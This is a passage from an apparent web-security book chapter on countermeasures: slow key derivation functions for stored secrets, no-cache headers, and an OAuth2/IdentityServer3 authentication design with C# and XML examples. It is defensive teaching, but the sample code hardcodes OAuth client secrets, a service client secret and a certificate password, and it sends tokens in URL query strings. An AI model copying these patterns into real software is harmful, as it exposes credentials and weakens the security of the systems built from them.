Maintain as few user accounts as possible on the servers in question and with the least privilege possible. 

#### Datastore Compromise {#web-applications-countermeasures-data-store-compromise}
![](images/ThreatTags/PreventionEASY.png)

As part of your defence in depth strategy, you should expect that your datastore is going to be stolen, but hope that it does not. You should be thinking about what assets within the datastore are sensitive. How are you going to prevent an attacker that has gained access to the datastore from making sense of the sensitive data?

As part of developing the application that uses the datastore, a strategy needs to be developed and implemented so business can carry on as usual when this happens. For example, when your detection mechanisms realise that someone unauthorised has been on the systems that host your datastore, and alerts have been fired off to the people that are going to investigate and audit, your application should take some automatic measures such as:

* All following logins should be instructed to change passwords

If you follow the recommendations below, datastore theft alone will be an inconvenience, but not a disaster.

Consider what sensitive information you really need to store, also consider using the following key derivation functions (KDFs) for all sensitive data, not just passwords. It is good to continue to [remind your customers](https://speakerdeck.com/binarymist/passwords-lol) to always use unique passwords. Passwords that are made up with a combination of alphanumeric, upper-case, lower-case and special characters. It is also worth considering pushing the use of high quality password vaults. Do not limit password lengths. Encourage the use of long passwords.

PBKDF2, bcrypt and [scrypt](http://www.tarsnap.com/scrypt.html), are KDFs that are designed to be slow. Used in a process commonly known as key stretching. The process of key stretching in terms of how long it takes can be tuned by increasing or decreasing the number of cycles used. Often 1000 cycles or more for passwords. "_The function used to protect stored credentials should balance attacker and defender verification. The defender needs an acceptable response time for verification of users’ credentials during peak use. However, the time required to map_ `<credential> -> <protected form>` _must remain beyond threats’ hardware (GPU, FPGA) and technique (dictionary-based, brute force, etc) capabilities._"

> OWASP Password Storage

PBKDF2, bcrypt and the newer scrypt, apply a Pseudorandom Function (PRF) such as a cryptographic hash, cipher or keyed-Hash Message Authentication Code (HMAC) to the data being received along with a unique salt. The salt should be stored with the hashed data.

Do not use MD5, SHA-1, or the SHA-2 family of cryptographic one-way hashing functions by themselves for cryptographic purposes such as hashing your sensitive data. In fact, do not use hashing functions at all for this unless they are leveraged with one of the mentioned KDFs. The hashing functions were not designed to be used alone for passwords (to be slow), the hashing speed can not be slowed as hardware continues to get faster. Many organisations that have had their datastores stolen, and continue to on a weekly basis, could avoid their secrets being compromised simply by using a decent KDF with salt and a decent number of iterations.
"_Using four AMD Radeon HD6990 graphics cards, I am able to make about 15.5 billion guesses per second using the SHA-1 algorithm._"

> Per Thorsheim

In saying that, PBKDF2 can use MD5, SHA-1 and the SHA-2 family of hashing functions. Bcrypt uses the Blowfish (more specifically the Eksblowfish) cipher. Scrypt does not have user replaceable parts like PBKDF2. The PRF can not be changed from SHA-256 to something else.

##### Which KDF to use? {#web-applications-countermeasures-data-store-compromise-which-kdf-to-use}

You have to consider many things to determine which KDF to use. I can't tell you which is the best one to use, which one to use depends on many things. You should gain your own understanding of at least the following best of breed KDFs often used for password hashing.

**PBKDF2** is the oldest KDF, and the most battle tested, but there have been lessons learned that have been applied to the latter two. These include that its utilised hashing functions (MD5, SHA) are CPU intensive and easily parallelised on GPUs and Application Specific Integrated Circuits, where it uses very little RAM. We see this in cryptocurrency mining.

The next oldest is **bcrypt** which uses the Eksblowfish cipher. This was designed specifically for bcrypt from the Blowfish cipher, to be very slow to initiate, thus boosting protection against dictionary attacks, which were often run on custom Application-specific Integrated Circuits (ASICs) with low gate counts, often found in GPUs of the day (1999).  
The hashing functions that PBKDF2 uses achieve speed increases on GPUs due to the ease of parallelisation, as opposed to the Eksblowfish cipher attributes such as:

1. Far greater memory required for each hash
2. Small and frequent pseudo-random memory accesses and modifications, making it harder to cache the data into faster memory and breaking parallelisation on GPUs.

GPUs are good at carrying out the exact same instruction set concurrently, but when a branch in the logic occurs (which is how the Blowfish algorithm works) on one of the sets, all others stop, which destroys parallelisation on GPUs.

The Arithmetic Logic Units (ALUs), or shaders of a GPU, are partitioned into groups, and each group of ALUs shares management, so members of the group cannot be made to work on separate tasks. They can either all work on nearly identical variations of one single task, in perfect sync with one another, or nothing at all.

Bcrypt was specifically designed to be non-GPU friendly, this is why it used the existing Blowfish cipher.

With hardware utilising large Field-programmable Gate Arrays (FPGAs), bcrypt bruteforcing is becoming more accessible due to easily obtainable cheap hardware such as the [Xeon+FPGA](http://www.extremetech.com/extreme/184828-intel-unveils-new-xeon-chip-with-integrated-fpga-touts-20x-performance-boost). We also have the likes of the [Xeon Phi](http://www.extremetech.com/extreme/133541-intels-64-core-champion-in-depth-on-xeon-phi) which has 60 1GHz cores (- several used by the system), each with 4 hardware threads. The Phi is pretty close to being a general purpose, many core CPU. The FPGAs are not easy to programme for, and neither is the Xeon Phi, as it has its own embedded Linux SOC which runs BusyBox, that you need to SSH into. The following board and chip are also worth considering, although you won't get the bruteforcing throughput of the Xeon+FPGA or Phi:

* [ZedBoard / Zynq 7020](http://picozed.org/product/zedboard)
* [Haswell](http://www.theplatform.net/2015/06/02/intel-finishes-haswell-xeon-e5-rollout-launches-broadwell-e3/)

**Scrypt** uses PBKDF2-HMAC-SHA-256 (PBKDF2 of HMAC-SHA256) as its PRF, and the [Salsa20/8](https://tools.ietf.org/html/rfc7914) core function, which is not a cryptographic hash function as it is not collision resistant to help pseudo-random writes to RAM, then repeatedly reads them in a pseudo-random sequence. FPGAs do not generally have a lot of RAM, so this makes leveraging both FPGAs and GPUs a lot less feasible and narrows down the field of potential hardware cracking options to many core multi-purpose CPUs, such as the Xeon Phi, ZedBoard, Haswell and others. 

&nbsp;

The sensitive data stored within a datastore should be the output of one of the three key derivation functions we have just discussed. Feed these with the data you want protected, and a unique salt. All good frameworks will have at least PBKDF2 and bcrypt APIs.

The new Argon2 is also worth considering if you like the bleeding edge.

#### Caching of Sensitive Data {#web-applications-countermeasures-management-of-application-secrets-caching-of-sensitive-data}
![](images/ThreatTags/PreventionVERYEASY.png)

Logging out from an application obviously does not clear the browser cache of any sensitive information that might have been stored. It is good to test that any sensitive data responses have `Cache-Control` and `Expires` headers set appropriately.

Use an HTTP intercepting proxy such as ZAP, Burp, etc. to search through the server responses that belong to the session, checking that the server instructed the browser not to cache any data for all responses containing sensitive information.

Use the following headers on such responses:

`Cache-Control: no-cache, no-store`  
`Expires: 0, or past date`  
`Pragma: no-cache`  

You can also add the following flags to the `Cache-Control` header in order to better prevent persistently linked files on the filesystem:

`must-revalidate`, `pre-check=0`, `post-check=0`, `max-age=0`, and `s-maxage=0`

To check that the browsers are respecting the headers, check the cache stores. For example:

For Mozilla Firefox:

* Unix/Linux: `~/.mozilla/firefox/<profile-id>/Cache/`
* Windows: `C:\Documents and Settings\<user_name>\Local Settings\Application Data\`  
  `Mozilla\Firefox\Profiles\<profile-id>\Cache>`

For Internet Explorer:

* `C:\Documents and Settings\<user_name>\Local Settings\Temporary Internet Files>`

Don't forget to plug all your changes into your Zap Regression Test suite as discussed in the Process and Practises chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).

#### Cracking

Slowing down and rendering cracking infeasible is addressed by the type of KDF and number of rounds you configure. We did this in the "[Which KDF to use](#web-applications-countermeasures-data-store-compromise-which-kdf-to-use)" section.

### Lack of Authentication, Authorisation and Session Management {#web-applications-countermeasures-lack-of-authentication-authorisation-session-management}
![](images/ThreatTags/PreventionDIFFICULT.png)

I'm going to walk you through some of the important parts of what a possible authentication and authorisation solution might look like. This will address the points raised in the [Identify Risks](#web-applications-identify-risks-lack-of-authentication-authorisation-session-management) section above.

![](images/RelevantAuthStandards.png)

The following code is one example of how we can establish authentication and authorisation for individuals desiring to work with a system comprised of any number of front-ends (web, mobile, etc), a service layer API that provides an abstraction to, and communicates with, the underlying back-end micro-services. The example uses the Resource Owner Password Credentials (ROPC) flow, which is quite a common flow with todays front-end -> service API -> back-end micro-service architectures.

It is also worth checking out the following sections in the OAuth 2.0 specification pertaining to the ROPC flow:

* [Resource Owner Password Credentials](http://tools.ietf.org/html/rfc6749#section-1.3.3)
* [Resource Owner Password Credentials Grant](http://tools.ietf.org/html/rfc6749#section-4.3)
* [Security Considerations](http://tools.ietf.org/html/rfc6749#section-10.7)

All the flows are detailed in the [OAuth 2.0](http://tools.ietf.org/html/rfc6749) and [OpenID Connect](http://openid.net/specs/openid-connect-core-1_0.html) specifications.

We will also discuss integrating external identity providers (The Facebooks, Twitters and Googles) of our world. 

#### Chosen technologies:

![](images/ChosenAuthTechnologies.png)

Coming to grips with and understanding enough to create a solution like this can be quite a steep learning experience. The folks from IdentityServer, who do this for the love of it, have created an outstanding Open Source Software (OSS) project, and in all my dealings with them have always gone out of their way to help. In all the projects I've worked on, with all the edge cases, there have always been ways to create a solution that satisfied the requirements.

#### Technology and Design Decisions

##### Reference Token vs JSON Web Token (JWT)

Ideally, reference access tokens should be used between front-end(s) and the service layer, as they are in this case, then use JWT, which contains a signed list of the users claims, from the service layer to the back-end micro-services.

JWTs can not be revoked as they are self-contained (contain everything about a user that is necessary to make a decision about what the user should be authorised to access).

Reference tokens, on the other hand, simply contain a reference to the user account, which is managed by an identity server via MembershipReboot in this case. This enables revocation (logging out of the user for example).

Identity server does not currently support both types of token at once, specifically the ability to switch between one or the other (reference for front-end, JWT for back-end), although it is [on the road map](https://github.com/IdentityServer/IdentityServer3/issues/1725). Until this configuration is supported, the service layer can get the user's claims by using the reference token, one of those claims being the user GUID. These claims can then be propagated to the micro-services.

##### IdentityServer3

IdentityServer2 was focussed on authentication with some OAuth2 support to assist with authentication.  
AuthorizationServer was more focussed on OAuth2 for delegated authorisation.  
IdentityServer3 is a C#.NET library that focuses on both authentication and authorisation. You don't have to have your surrounding out of process components (service layer, micro-services) in .NET for IdentityServer3 to be a viable option. They can be written in another language, so long as they speak HTTP.

##### MembershipReboot {#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot}

MembershipReboot is a user identity management library with a similar name to the ASP.NET Membership Provider, which inspired it due to [frustrations](http://brockallen.com/2012/09/02/think-twice-about-using-membershipprovider-and-simplemembership/) that Brock Allen (MembershipReboot creator) had such as:  

1. A misguided false perception of security
2. A leaky abstraction due to the 27 abstract methods that aren't likely pertinent to your applications needs. Any custom provider you build will need to implement all of these methods, whether they are useful to your application or not. Otherwise consumers of your custom provider will receive a NotImplementedException. If you choose to only implement the methods that make sense for your application, then consumers need to know to much about your custom providers internals. As such encapsulation has broken down and abstraction is leaking
3. The lockout feature, when a certain number of incorrect login attempts occurred, the account would be locked, preventing any further attempts. This also prevents the legitimate account owner from logging in, and is thus a denial of service (DoS), as there is no ability to unlock the account after a certain period of time. MembershipReboot includes the `AccountLockoutFailedLoginAttempts` and the much needed `AccountLockoutDuration` on the `MembershipRebootConfiguration` class, which does exactly what you expect it to do
4. Others
 
Some noteworthy benefits I've found with MembershipReboot are:

1. On a project I was working on some time ago, MembershipUser did not provide the properties I needed, so I had to hide MembershipUser as an Adaptee within an Adapter pattern implementation, a bit like this:
    
    {title="MembershipUser.cs", linenos=off, lang=C#}
        namespace My.MembershipAPI {
           /// <summary>
           /// Utilising the Adapter pattern, gives us control over the Target (MembershipUser)
	       /// interface. The adapter interface (CustomMembershipUser) provides members that
	       /// our client (that's our call sites) can use.
           /// The MembershipUser interface can't be used by our clients as it is, because
	       /// we have a different set of parameters to pass.
           /// Hence we provide an adapter (CustomMembershipUser)
           /// The Adaptee (User) becomes part of the Target (MembershipUser) by way of
	       /// Adapter (CustomMembershipUser)
           /// </summary>
           public class CustomMembershipUser : MembershipUser {
           
              public CustomMembershipUser(
                 MembershipUser membershipUser,
                 string firstName,
                 string lastName,
                 long securityQuestionId,
                 bool isBusinessAStartup,
                 string businessName
              ) : base (
                 membershipUser.ProviderName,
                 membershipUser.UserName,
                 membershipUser.ProviderUserKey,
                 membershipUser.Email,
                 membershipUser.PasswordQuestion,
                 membershipUser.Comment,
                 membershipUser.IsApproved,
                 membershipUser.IsLockedOut,
                 membershipUser.CreationDate,
                 membershipUser.LastLoginDate,
                 membershipUser.LastActivityDate,
                 membershipUser.LastPasswordChangedDate,
                 membershipUser.LastLockoutDate
              ) {
                 UserAccount = new User {
                    FirstName = firstName,
                    LastName = lastName,
                    SecurityQuestionId = securityQuestionId,
                    isBusinessAStartup = isBusinessAStartup,
                    MembershipUserId = (Guid)membershipUser.ProviderUserKey,
                    BusinessName = businessName
                 };
              }
              
              public CustomMembershipUser(MembershipUser membershipUser) : base (
                 membershipUser.ProviderName,
                 membershipUser.UserName,
                 membershipUser.ProviderUserKey,
                 membershipUser.Email,
                 membershipUser.PasswordQuestion,
                 membershipUser.Comment,
                 membershipUser.IsApproved,
                 membershipUser.IsLockedOut,
                 membershipUser.CreationDate,
                 membershipUser.LastLoginDate,
                 membershipUser.LastActivityDate,
                 membershipUser.LastPasswordChangedDate,
                 membershipUser.LastLockoutDate
              ) {}
              
              /// <summary>
              /// Provides get and set access to our User 
              /// </summary>
              public User UserAccount { get; set; }
           }
        }
        
    The preferred method is the path of [MembershipReboot](https://github.com/brockallen/BrockAllen.MembershipReboot) and [IdentityServer3.MembershipReboot](https://github.com/IdentityServer/IdentityServer3.MembershipReboot), which is a "_User Service plugin for IdentityServer v3 that uses MembershipReboot as its identity management library. In other words, you're using IdentityServer v3 and you want to use MembershipReboot as your database for user passwords..._", you're provided with the ability to customise, out of the box. All you need to do is add the properties you require to the already provided [`CustomUser`](https://github.com/IdentityServer/IdentityServer3.MembershipReboot/blob/master/source/WebHost/MR/CustomUser.cs) and the data store schema which is also provided in an Entity Framework project that comes with MembershipReboot.
    
    {title="IdentityServer3.MembershipReboot\\source\\WebHost\\MR\\CustomUser.cs", linenos=off, lang=C#}
        namespace WebHost.MR {
           public class CustomUser : RelationalUserAccount {
              public virtual string FirstName { get; set; }
              public virtual string LastName { get; set; }
              public virtual int? Age { get; set; }
           }
           
           public class CustomUserAccountService : UserAccountService<CustomUser> {
              public CustomUserAccountService(CustomConfig config, CustomUserRepository repo)
                 : base(config, repo) {
              }
           }
           
           public class CustomUserRepository
              : DbContextUserAccountRepository<CustomDatabase, CustomUser> {
                 public CustomUserRepository(CustomDatabase ctx) : base(ctx) {}
	       }
        }
        
2. The security focussed [configuration](https://github.com/brockallen/BrockAllen.MembershipReboot/wiki/Security-Settings-Configuration). You can choose to set this within code or config.  
Password storage, as discussed above under the [Datastore Compromise](#web-applications-countermeasures-data-store-compromise) section, is [addressed](http://brockallen.com/2014/02/09/how-membershipreboot-stores-passwords-properly/) by using the mature PBKDF2 and providing a config setting in the form of `passwordHashingIterationCount` on the `MembershipRebootConfiguration` class to dial in the number of iterations (stretching), as seen below on line 29. This provides us with what's known as an adaptive one-way function. It's adaptive because the workload increases each year to keep up with advances in hardware technology. You now have control of how slow you want it to be to crack those passwords. What's more, the iteration count can be set to change each year automatically. If the developer chooses not to touch the iteration count at all (or more likely, forgets), then the default of 0 is inferred. 0 means to automatically calculate the number based on the [OWASP recommendations](https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet) for the current year. In the year 2000 it should be 1000 iterations. The count should be doubled each subsequent two years, so in 2016 we should be using 256000 iterations and that's what MembershipReboot does if the setting is not changed.
    
    {title="backend\\Auth\\AuthService.WebApi\\app.config", linenos=on, lang=XML}
        <!--Lives in Auth Service of Architecture diagram below.-->
        <?xml version="1.0" encoding="utf-8"?>
        <configuration>
          <configSections>
            <section
              name="membershipReboot"
              type="BrockAllen.MembershipReboot.SecuritySettings,
              BrockAllen.MembershipReboot" />
            <section
              name="entityFramework"
              type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection,
              EntityFramework,
              Version=6.0.0.0,
              Culture=neutral,
              PublicKeyToken=b77a5c561934e089"
              requirePermission="false" />
            <connectionStrings>
              <add 
                name="MembershipReboot"
                connectionString=
                "Data Source=(LocalDb)\v11.0;InitialCatalog=AuthServiceDb;Integrated Security=True"
                providerName="System.Data.SqlClient" />      
            </connectionStrings>
            <membershipReboot
              requireAccountVerification="true"
              emailIsUsername="false"
              multiTenant="false"
              allowAccountDeletion="true"
              passwordHashingIterationCount="0"
              accountLockoutDuration="00:01:00"
              passwordResetFrequency="0" />          
            <!--
            Test user bob with password secret was created with 10 iterations of the PBKDF2 KDF
            
            "secret" 10 iterations:
            A.ABP7I2M56JTnekBoUjUtG7G4poxMO3Br+cAPgXqYx//0KKxqILb7uYjuE9ofBr7amQ==
            "secret" 10000 iterations:
            3E800.AN02zizsHZG45IlCu0/8UjPZuwcopaSSBkU/d6VHq3pknf2BE7ExiLL38clIKn575g==
            
            Some more details on how the hash is constructed can be found here:
            https://github.com/brockallen/BrockAllen.MembershipReboot/issues/603
            -->
          </configSections>  
        </configuration>
    
    The iteration count of each users password is stored with the hashed password, as can be seen above on lines 36 and 38. This means each password can have a different number of iterations applied over time as required. Beautifully thought out!
    
    With the ASP.NET Membership Provider you can have salted SHA1 which, as already mentioned, was not designed for what it was chosen to be used for in this case, and there doesn't appear to be any thought to (Moore's Law) the fact that machines keep getting faster. MD5 and SHA were designed to be fast, not slow or slowable. Storing passwords hashed with SHA-1 means that they are incredibly fast to crack.

Sadly the next offering in this space (ASP.NET Identity), produced by Microsoft, also seems inferior. Brock Allen blogged about some of the shortcomings in his post titled "_[The good, the bad and the ugly of ASP.NET Identity](http://brockallen.com/2013/10/20/the-good-the-bad-and-the-ugly-of-asp-net-identity/#ugly)_" to which MembershipReboot caters, per the following:

* Email account verification
* Password reset
* Username reminder
* Account lockout
* Password guessing prevention
* Close/Delete account
* Modern password storage strategies (as already discussed)
* Mobile phone verification
* Two factor authentication
* Certificate based authentication
* Auditing
* Tracing

##### External Identity Providers

Microsoft Katana provides support for

* WS-Federation
* OpenID Connect
* Google
* Twitter
* Microsoft Account
* Facebook

There are also many other community-provided [OWIN OAuth middleware providers](https://github.com/RockstarLabs/OwinOAuthProviders) 

The OWIN startup or config file could look like the following. You can see, in the second half of the code file, the configuration of the external identity providers:

{title="backend\\Auth\\AuthService.WebApi\\Owin\\OwinConfig.cs", linenos=off, lang=C#}
    // Lives in Auth Service of Architecture diagram below.
    using System;
    using System.Collections.Generic;
    using System.Security.Cryptography.X509Certificates;
    using System.Web.Http;
    using AuthService.WebApi.IdSvr;
    using IdentityManager.Logging;
    using IdentityManager.Core.Logging;
    using IdentityServer3.Core.Configuration;
    using Infrastructure.IOC;
    using Infrastructure.WebApi.Owin;
    using Microsoft.Owin.Security.Facebook;
    using Microsoft.Owin.Security.Google;
    using Microsoft.Owin.Security.Twitter;
    using Owin;
    using Serilog;
    
    namespace AuthService.WebApi.Owin {
    
       public class OwinConfig : IOwinConfig {
          // Todo: Add to config file
          public string Name => "Auth Service OWIN Self-Host";
          public string Protocol => "https";
          public string HostName => "localtest.me";
          public int Port => 44334;
          public List<string> Subdomains => new List<string> { "identity" };
    
          public HttpConfiguration BuildConfiguration(IAppBuilder app) {
             // Unhandled exception logger.
             app.Use<GlobalExceptionMiddleware>();
    
             LogProvider.SetCurrentLogProvider(new DiagnosticsTraceLogProvider());
             // TODO: Needs to use IoC to initialise the api controllers.
             Log.Logger = Ioc.Get<Infrastructure.Logging.ILog>().Logger;    
    
             IdentityServerServiceFactory idSvrFactory =
             Factory.Configure(AuthServiceWebApiConstants.ConnectionString);
             idSvrFactory.ConfigureCustomUserService(
                AuthServiceWebApiConstants.ConnectionString
             );
    
             IdentityServerOptions options = new IdentityServerOptions {
                SiteName = "Auth Service",
                SigningCertificate = LoadCertificate(),
                Factory = idSvrFactory,
                AuthenticationOptions = new AuthenticationOptions {
                   IdentityProviders = ConfigureAdditionalIdentityProviders,
                },
                RequireSsl = true // Default = true.                
             };
    
             app.UseIdentityServer(options);
    
             return new HttpConfiguration();
          }
    
          public static void ConfigureAdditionalIdentityProviders(
             IAppBuilder app,
             string signInAsType
          ) {
             GoogleOAuth2AuthenticationOptions google = new GoogleOAuth2AuthenticationOptions {
                AuthenticationType = "Google",
                SignInAsAuthenticationType = signInAsType,
                ClientId =
                   "767400843187-8boio83mb57ruogr9af9ut09fkg56b27.apps.googleusercontent.com",
                ClientSecret = "5fWcBT0udKY7_b6E3gEiJlze"
             };
             app.UseGoogleAuthentication(google);
    
             FacebookAuthenticationOptions fb = new FacebookAuthenticationOptions {
                AuthenticationType = "Facebook",
                SignInAsAuthenticationType = signInAsType,
                AppId = "676607329068058",
                AppSecret = "9d6ab75f921942e61fb43a9b1fc25c63"
             };
             app.UseFacebookAuthentication(fb);
    
             TwitterAuthenticationOptions twitter = new TwitterAuthenticationOptions {
                AuthenticationType = "Twitter",
                SignInAsAuthenticationType = signInAsType,
                ConsumerKey = "N8r8w7PIepwtZZwtH066kMlmq",
                ConsumerSecret = "df15L2x6kNI50E4PYcHS0ImBQlcGIt6huET8gQN41VFpUCwNjM"
             };
             app.UseTwitterAuthentication(twitter);
          }
    
          private X509Certificate2 LoadCertificate() => new X509Certificate2(
             $@"{AppDomain.CurrentDomain.BaseDirectory}\idsrv3test.pfx", "idsrv3test"
          );
       }
    }


#### Architecture

![](images/AuthArchitecture.png)

{title="backend\\Auth\\AuthService.WebApi\\AuthServiceWebApiConstants.cs", linenos=off, lang=C#}
    // Lives in Auth Service of Architecture diagram above.
    namespace AuthService.WebApi {
       public class AuthServiceWebApiConstants {
          public const string AccessTokenValidationUrl =
             "https://identity.localtest.me:44334/connect/accesstokenvalidation?token=";
          public const string ClientConnectTokenUrl =
             "https://identity.localtest.me:44334/connect/token";
          public const string ConnectionString = "AuthServiceDb";
          // 1 day of seconds. Make sure this is equivalent to what the service layer
	      // API is specifying.
          public const int UserAccessLifetime = 86400;
          public const string ServiceLayerClientSecret =
             "9b28b73e-9f66-42bf-ba87-189569136b20";
          public const string ServiceLayerClientId = "ServiceLayerClient";
          public const string CookieName = "sessionId";
          public const int TokenCleanupIntervalSeconds = 60;
       }
    }


{title="client\\ServiceLayer\\ServiceLayerConstants.cs", linenos=off, lang=C#}
    // Lives in Service Layer APIs of Architecture diagram above.
    namespace ServiceLayer {
       public class ServiceLayerConstants {
          public const string AccessTokenValidationUrl =
             "https://identity.localtest.me:44334/connect/accesstokenvalidation?token=";
          public const string ClientConnectTokenUrl =
             "https://identity.localtest.me:44334/connect/token";
          // Days. Make sure this is equivalent to what the auth service is specifying.
          public const double UserAccessLifetime = 1;
          public const string ServiceLayerClientSecret =
             "9b28b73e-9f66-42bf-ba87-189569136b20";
          public const string ServiceLayerClientId = "ServiceLayerClient";
          public const string CookieName = "sessionId";
       }
    }


{title="backend\\Auth\\AuthService.WebApi\\IdSvr\\Clients.cs", linenos=off, lang=C#}
    // Lives in Auth Service of Architecture diagram above.
    using System.Collections.Generic;
    using IdentityServer3.Core;
    using IdentityServer3.Core.Models;
    
    namespace AuthService.WebApi.IdSvrApi {
       public static class Clients {
          public static List<Client> Get() {
             return new List<Client> {
    
                // human is involved
                new Client {
                   ClientName = "Silicon on behalf of Carbon Client",
                   ClientId = AuthServiceWebApiConstants.ServiceLayerClientId,
                   Enabled = true,
                   AccessTokenType = AccessTokenType.Reference,
                   AccessTokenLifetime = AuthServiceWebApiConstants.UserAccessLifetime,
                   Flow = Flows.ResourceOwner,
    
                   RedirectUris = new List<string> {
                      "https://localtest.me:44334"
                   },
    
                   AllowedScopes = new List<string> {
                      Constants.StandardScopes.OpenId,
                      Constants.StandardScopes.Profile,
                      Constants.StandardScopes.Roles,
                      Constants.StandardScopes.OfflineAccess, // For refresh tokens
                      "microservice1",
                      "microservice2",
                      // Etc.
                   },
    
                   ClientSecrets = new List<Secret> {
                      new Secret(AuthServiceWebApiConstants.ServiceLayerClientSecret.Sha256())
                   },
                   /*
                   identityserver.github.io/Documentation/docs/configuration/clients.html
                   Docs on how the config for the refresh token life-cycle works:
                   identityserver.github.io/Documentation/docs/advanced/refreshTokens.html
                   */
                   AbsoluteRefreshTokenLifetime = 2592000, // Seconds: default of 30 days.
                   SlidingRefreshTokenLifetime = 1296000, // Seconds: default of 15 days.
                   RefreshTokenUsage = TokenUsage.OneTimeOnly,
                   RefreshTokenExpiration = TokenExpiration.Sliding
                }
             };
          }
       }
    }

{title="client\\ServiceLayer\\Authentication\\CookieRequestReader.cs", linenos=off, lang=C#}
    // Lives in Service Layer API of Architecture diagram above.
    using System.Linq;
    using System.Net.Http;
    using System.Net.Http.Headers;
    
    namespace ServiceLayer.Authentication {
       /// <summary>Reads any cookie value from the request</summary
       public static class CookieRequestReader {
          public static string GetCookieValue(HttpRequestMessage request, string cookieName) {
             CookieHeaderValue cookie =
                request.Headers.GetCookies(cookieName).FirstOrDefault();
             if (cookie != null) return cookie[cookieName].Value;
             return null;
          }
       }
    }

{title="client\\ServiceLayer\\Authentication\\AuthServiceValidator.cs", linenos=off, lang=C#}
    // Lives in Service Layer API of Architecture diagram above.
    using System.Collections.Generic;
    using System.IO;
    using System.Net;
    using System.Net.Http;
    using System.Text;
    using System.Threading.Tasks;
    using Infrastructure.Logging;
    
    namespace ServiceLayer.Authentication {
       public class AuthServiceValidator : IIdentityValidator {
          private readonly ILog _log;
    
          public AuthServiceValidator(ILog log) {
             _log = log;
          }
    
          // Called on each resource request other than login/outs.
          public string GetTokenClaims(string token) {
             // There's no cookie so no point checking with the auth service.
             if (string.IsNullOrEmpty(token)) return null;
    
             string url = ServiceLayerConstants.AccessTokenValidationUrl + token;
    
             HttpWebRequest outgoingRequest = (HttpWebRequest)WebRequest.Create(url);
             try {
                using (HttpWebResponse response =
                   (HttpWebResponse)outgoingRequest.GetResponse()) {
                   if (response.StatusCode == HttpStatusCode.OK) {
                      using (Stream stream = response.GetResponseStream()) {
                         StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                         string accessTokenValidationJson = reader.ReadToEnd();
                         return accessTokenValidationJson;
                      }
                   }
    
                   _log.Warning(
                      $"Received HTTP status code {response.StatusCode} when calling " +
                      "Identity Server token validation service."
                   );
                   return null;
                }
             } catch (WebException e)
                when (((HttpWebResponse)e.Response).StatusCode == HttpStatusCode.BadRequest) {
                   return null;
             }
          }
    
          // This addresses the faulty logout risk.
          // Called by SecureController.
          public async Task<bool> LogMeOut(string token) {
             string tokenRevocationEndpoint =
                "https://identity.localtest.me:44334/connect/revocation";
    
             Dictionary<string, string> postBody = new Dictionary<string, string> {
                { "token", token },
                { "token_type_hint", "access_token" }
             };
             HttpClient client = new HttpClient();
             client.SetBasicAuthentication(
                ServiceLayerConstants.ServiceLayerClientId,
                ServiceLayerConstants.ServiceLayerClientSecret
             );
             HttpResponseMessage response = await client.PostAsync(
                tokenRevocationEndpoint,
                new FormUrlEncodedContent(postBody)
             );
             return response.StatusCode == HttpStatusCode.OK;
          }
       }
    }

%% {title="client\ServiceLayer\Authentication\AuthenticationHandler.cs", linenos=on, lang=C#}


{title="client\\ServiceLayer\\APIControllers\\SecureController.cs", linenos=off, lang=C#}
    // Lives in Service Layer API of Architecture diagram above.
    using System;
    using System.Collections.Generic;
    using System.Web.Http;
    using System.Net.Http;
    using System.Net.Http.Headers;
    using System.Threading.Tasks;
    using ServiceLayer.Authentication;
    using IdentityModel.Client;
    using Infrastructure.IOC;
    using Infrastructure.Logging;
    
    namespace ServiceLayer.ApiControllers {
    
       [RoutePrefix("api/secure")]
       public class SecureController : ApiController {
          public class LoginDto {
             public string Username { get; set; }
             public string Password { get; set; }
          }
    
          // TokenClient is an Identity Server component.
          private TokenClient _tokenClient;
          private readonly IIdentityValidator _identityValidator;
    
          public SecureController() {
             //  TODO: Needs to use IoC to initialise the api controllers.
             _identityValidator = new AuthServiceValidator(Ioc.Get<ILog>());
    
             _tokenClient = new TokenClient(
                 ServiceLayerConstants.ClientConnectTokenUrl,
                 ServiceLayerConstants.ServiceLayerClientId,
                 ServiceLayerConstants.ServiceLayerClientSecret
             );
          }
    
          [HttpPost]
          [Route("login")]
          public HttpResponseMessage Login(LoginDto login) {
             TokenResponse tokenResponse = GetUserAccessToken(
                // Must include offline_access scope for refresh token.
                new Dictionary<string, string>() {
                   { "userName", login.Username },
                   { "passWord", login.Password },
                   { "scope", "TaskService offline_access" }
                }
             );
             return CreateLoginResponse(tokenResponse);
          }
    
          [HttpGet]
          [Route("logout")]
          public async Task<HttpResponseMessage> Logout() {
             CookieHeaderValue cookie = new CookieHeaderValue(
                ServiceLayerConstants.CookieName,
                string.Empty
             );
             const int yesterday = -1;
             HttpResponseMessage response = new HttpResponseMessage();
             string token = CookieRequestReader.GetCookieValue(
                Request,
                ServiceLayerConstants.CookieName
             );
             bool loggedOut = await _identityValidator.LogMeOut(token);
    
             cookie.MaxAge = TimeSpan.Zero;
             cookie.Expires = DateTimeOffset.Now.AddDays(yesterday);
             cookie.HttpOnly = true;
             cookie.Domain = ".localtest.me";
             cookie.Path = "/";
    
             response.Headers.AddCookies(new CookieHeaderValue[] { cookie });
             response.Content = new StringContent($"{{\"LoggedOut\":\"{loggedOut}\"}}");
             return response;
          }
    
          // Used as part of the "remember me" strategy.
          // Front-end calls when new access token is required.
          [HttpGet]
          [Route("refreshsession")]
          public HttpResponseMessage RefreshSession(string refreshToken) {
             TokenResponse response = _tokenClient.RequestRefreshTokenAsync(
                refreshToken
             ).Result;
             HttpResponseMessage message = CreateLoginResponse(response);
             return message;
          }
    
          private TokenResponse GetUserAccessToken(Dictionary<string, string> credsAndScope) {
             var req = _tokenClient.RequestResourceOwnerPasswordAsync(
                credsAndScope["userName"],
                credsAndScope["passWord"],
                credsAndScope["scope"]
             );
             return req.Result;
          }
    
          private HttpResponseMessage CreateLoginResponse(TokenResponse tokenResponse) {
             CookieHeaderValue cookie = new CookieHeaderValue(
                ServiceLayerConstants.CookieName,
                tokenResponse.AccessToken
             );
	         /*
             owasp.org/index.php/Session_Management_Cheat_Sheet#Expire_and_Max-Age_Attributes
	         */
             cookie.Expires = DateTimeOffset.Now.AddDays(
                ServiceLayerConstants.UserAccessLifetime
             );
             cookie.MaxAge = new TimeSpan(
                hours: ((int)ServiceLayerConstants.UserAccessLifetime) * 24,
                minutes: 0,
                seconds: 0
             );
             cookie.HttpOnly = true;
